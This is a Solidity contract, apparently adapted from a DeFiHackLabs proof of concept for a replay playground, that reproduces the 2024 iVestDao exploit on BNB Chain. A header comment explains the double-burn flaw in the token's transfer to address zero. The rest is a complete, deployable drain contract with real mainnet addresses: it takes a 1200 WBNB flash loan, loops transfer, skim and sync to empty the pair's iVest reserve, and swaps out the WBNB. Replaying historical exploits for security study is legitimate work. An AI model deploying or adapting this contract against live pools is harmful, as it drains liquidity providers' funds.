// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-08-IvestDao).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest is Test` contract: testExploit() takes a PancakeSwap V3
// flash loan of WBNB, and the `pancakeV3FlashCallback` (which does the
// entire attack) lives on the test contract itself. There is therefore no
// standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack (testExploit body -> run(); the flash callback
// and swap_token_to_token helper copied verbatim) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/IvestDao_exp.sol.
//
// Root cause: iVESTDAO is a reflection token whose _transfer() treats ANY
// send to address(0) as a 100%-burn "donation" via __MakeDonation(...,3),
// but the branch has no `return` -- it falls through into the ordinary
// _tokenTransfer(from,to,amount,takeFee) below, moving the SAME amount a
// second time. PancakeSwap V2's skim(address(0)) makes the iVest/WBNB pair
// itself call iVest.transfer(address(0), surplus), so each skim+sync burns
// DOUBLE the surplus out of the pair's iVest reserve while its WBNB reserve
// stays untouched. Repeating transfer->skim->sync ratchets the pair's iVest
// reserve down to near zero, letting the attacker buy the entire WBNB side
// of the pool with dust iVest.

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function approve(address guy, uint256 wad) external returns (bool);
    function transfer(address dst, uint256 wad) external returns (bool);
}

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function skim(address to) external;
    function sync() external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract IvestDaoDrain {
    IWBNB internal constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20Like internal constant iVest = IERC20Like(0x786fCF76dC44B29845f284B81f5680b6c47302c6);
    IUniPairV3 internal constant pool = IUniPairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniRouterV2 internal constant router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniPairV2 internal constant iVest_pair = IUniPairV2(0x2607118D363789f841d952f02e359BFa483955f9);

    uint256 internal borrow_amount;

    function run() external {
        // Mirror testExploit(): flash-borrow 1200 WBNB (token1) from the
        // PancakeSwap V3 WBNB pool. The callback below does the whole attack.
        borrow_amount = 1200 ether;
        pool.flash(address(this), 0, borrow_amount, "");
    }

    function pancakeV3FlashCallback(uint256, /*fee0*/ uint256 fee1, bytes memory /*data*/ ) public {
        // Pump: swap 40 WBNB -> iVest, 30 times, inflating the iVest reserve
        // of the pair relative to WBNB (sets up the skim surplus).
        uint256 i = 0;
        while (i < 30) {
            swap_token_to_token(address(WBNB), address(iVest), 40 ether);
            i++;
        }

        // The double-burn lever: sending iVest to address(0) via skim burns
        // it TWICE (the _transfer() burn-donation branch has no `return`).
        // Repeat transfer -> skim(0) -> sync() three times to ratchet the
        // pair's iVest reserve down while its WBNB reserve stays pinned.
        i = 0;
        while (i < 3) {
            iVest.transfer(address(iVest_pair), 100_000_000_000);
            iVest_pair.skim(address(0));
            iVest_pair.sync();
            i++;
        }
        iVest.transfer(address(iVest_pair), 13_520_128_050);
        iVest_pair.skim(address(0));
        iVest_pair.sync();

        // whale fee here, need some calculate. Swap all remain token will
        // lead to error. May be the contract will use more token than you
        // transfer.
        swap_token_to_token(address(iVest), address(WBNB), 30_820_994_590);

        // Repay the V3 flash loan (amount + fee1).
        WBNB.transfer(address(pool), borrow_amount + fee1);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20Like(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
